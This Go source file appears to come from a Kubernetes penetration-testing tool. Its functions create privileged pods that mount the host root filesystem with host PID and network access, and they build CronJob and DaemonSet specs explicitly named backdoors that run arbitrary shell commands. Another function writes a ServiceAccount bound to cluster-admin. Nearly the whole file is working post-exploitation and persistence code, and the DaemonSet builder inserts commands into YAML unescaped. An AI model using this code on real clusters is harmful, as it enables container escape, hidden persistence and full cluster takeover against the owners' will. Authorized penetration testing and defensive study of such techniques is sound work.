package kubectl

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/dynamic"
	"sigs.k8s.io/yaml"
)

func (c *Client) ApplyYAML(ctx context.Context, yamlContent string) (string, error) {
	jsonData, err := yaml.YAMLToJSON([]byte(yamlContent))
	if err != nil {
		return "", fmt.Errorf("yaml to json: %w", err)
	}
	obj := &unstructured.Unstructured{}
	if err := json.Unmarshal(jsonData, obj); err != nil {
		return "", fmt.Errorf("unmarshal: %w", err)
	}
	gvk := obj.GetObjectKind().GroupVersionKind()
	if gvk.Kind == "" || gvk.Version == "" {
		return "", fmt.Errorf("YAML missing apiVersion/kind")
	}

	// GVR mapping
	resourceMap := map[string]string{
		"Pod": "pods", "Service": "services", "Secret": "secrets", "ConfigMap": "configmaps",
		"ServiceAccount": "serviceaccounts", "Deployment": "deployments", "DaemonSet": "daemonsets",
		"CronJob": "cronjobs", "Job": "jobs", "ClusterRoleBinding": "clusterrolebindings",
		"ClusterRole": "clusterroles", "RoleBinding": "rolebindings", "Role": "roles",
	}
	resource := resourceMap[gvk.Kind]
	if resource == "" {
		resource = strings.ToLower(gvk.Kind) + "s"
	}

	dynamicClient, err := dynamic.NewForConfig(c.config)
	if err != nil {
		return "", fmt.Errorf("dynamic client: %w", err)
	}
	ns := obj.GetNamespace()
	dr := dynamicClient.Resource(gvk.GroupVersion().WithResource(resource)).Namespace(ns)
	_, err = dr.Create(ctx, obj, metav1.CreateOptions{})
	if err != nil {
		data, _ := json.Marshal(obj.Object)
		_, err = dr.Patch(ctx, obj.GetName(), types.ApplyPatchType, data, metav1.PatchOptions{FieldManager: "k8spen-ng"})
		if err != nil {
			return "", fmt.Errorf("apply %s/%s: %w", gvk.Kind, obj.GetName(), err)
		}
		return fmt.Sprintf("applied(patched) %s/%s in %s", gvk.Kind, obj.GetName(), ns), nil
	}
	return fmt.Sprintf("created %s/%s in %s", gvk.Kind, obj.GetName(), ns), nil
}

// CreatePrivilegedPod creates a privileged pod with host mounts
func (c *Client) CreatePrivilegedPod(ctx context.Context, namespace string, pod *corev1.Pod) (*corev1.Pod, error) {
	var privileged bool = true
	if pod.Spec.Containers[0].SecurityContext == nil {
		pod.Spec.Containers[0].SecurityContext = &corev1.SecurityContext{}
	}
	pod.Spec.Containers[0].SecurityContext.Privileged = &privileged
	pod.Spec.HostPID = true
	pod.Spec.HostNetwork = true
	return c.Clientset.CoreV1().Pods(namespace).Create(ctx, pod, metav1.CreateOptions{})
}

// CreateCronJob creates a CronJob backdoor
func (c *Client) CreateCronJob(ctx context.Context, namespace string, cronJob *batchv1.CronJob) (*batchv1.CronJob, error) {
	return c.Clientset.BatchV1().CronJobs(namespace).Create(ctx, cronJob, metav1.CreateOptions{})
}

// BuildBackdoorPod creates a privileged pod spec
func BuildBackdoorPod(name, namespace, image, mountPath, nodeName string) *corev1.Pod {
	var hostPathType corev1.HostPathType = corev1.HostPathDirectory
	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: namespace,
			Labels:    map[string]string{"app": "backdoor"},
		},
		Spec: corev1.PodSpec{
			HostPID:     true,
			HostNetwork: true,
			Containers: []corev1.Container{{
				Name:    "backdoor",
				Image:   image,
				Command: []string{"/bin/sh"},
				Args:    []string{"-c", "while true; do sleep 3600; done"},
				VolumeMounts: []corev1.VolumeMount{{
					Name:      "host-root",
					MountPath: mountPath,
				}},
			}},
			Volumes: []corev1.Volume{{
				Name: "host-root",
				VolumeSource: corev1.VolumeSource{
					HostPath: &corev1.HostPathVolumeSource{
						Path: "/",
						Type: &hostPathType,
					},
				},
			}},
		},
	}
	return pod
}

// BuildCronJobBackdoor creates a CronJob backdoor spec
func BuildCronJobBackdoor(name, namespace, image, schedule, command string) *batchv1.CronJob {
	return &batchv1.CronJob{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: namespace,
		},
		Spec: batchv1.CronJobSpec{
			Schedule: schedule,
			JobTemplate: batchv1.JobTemplateSpec{
				Spec: batchv1.JobSpec{
					Template: corev1.PodTemplateSpec{
						Spec: corev1.PodSpec{
							Containers: []corev1.Container{{
								Name:    "backdoor",
								Image:   image,
								Command: []string{"/bin/sh"},
								Args:    []string{"-c", command},
							}},
							RestartPolicy: corev1.RestartPolicyOnFailure,
						},
					},
				},
			},
		},
	}
}

// BuildDaemonSetBackdoor creates a DaemonSet backdoor spec (as raw YAML)
func BuildDaemonSetBackdoor(name, namespace, image, mountPath, command string) string {
	hostMount := ""
	if mountPath != "" {
		hostMount = fmt.Sprintf(`
        volumeMounts:
        - name: host-root
          mountPath: %s`, mountPath)
	}
	return fmt.Sprintf(`apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: %s
  namespace: %s
spec:
  selector:
    matchLabels:
      app: %s
  template:
    metadata:
      labels:
        app: %s
    spec:
      hostPID: true
      containers:
      - name: backdoor
        image: %s
        command: ["/bin/sh"]
        args: ["-c", "%s"]
        securityContext:
          privileged: true
%s
      volumes:
      - name: host-root
        hostPath:
          path: /
`, name, namespace, name, name, image, command, hostMount)
}

// BuildAdminSAYAML creates YAML for a cluster-admin SA
func BuildAdminSAYAML(namespace, saName, bindingName string) (string, string) {
	saYAML := fmt.Sprintf(`apiVersion: v1
kind: ServiceAccount
metadata:
  name: %s
  namespace: %s
`, saName, namespace)
	bindingYAML := fmt.Sprintf(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: %s
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: %s
  namespace: %s
`, bindingName, saName, namespace)
	return saYAML, bindingYAML
}
